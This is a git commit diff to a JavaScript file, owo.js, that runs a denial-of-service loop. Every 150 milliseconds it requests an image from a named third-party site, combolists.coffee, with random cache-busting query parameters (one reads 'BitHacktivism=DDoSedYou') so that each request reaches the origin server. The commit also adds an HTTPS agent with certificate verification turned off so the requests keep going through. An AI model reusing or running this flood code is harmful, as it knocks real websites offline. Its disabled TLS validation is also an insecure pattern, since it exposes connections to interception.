8da73c835d06d12e18793695a4ef7db6149015cf
SwxtchCode <swxtchcode@protonmail.com>
2020-11-29 14:50:43 -0800

    Update owo.js

--- owo.js
+++ owo.js
@@ -26,6 +26,11 @@ setInterval(() => {
 });
 */
 
+import https from "https";
+const agent = new https.Agent({
+  rejectUnauthorized: false
+});
+
 const fetch = require('node-fetch');
 
 
@@ -33,9 +38,7 @@ yeet = () => {
         
    var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
   var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
-fetch("https://combolists.coffee/wp-content/uploads/2020/04/cropped-EU2xmPdXgAAmhQg.jpg?daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {
-  "method": "GET",
-});
+fetch("https://combolists.coffee/wp-content/uploads/2020/04/cropped-EU2xmPdXgAAmhQg.jpg?daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
 }
 
 setInterval(yeet, 150);
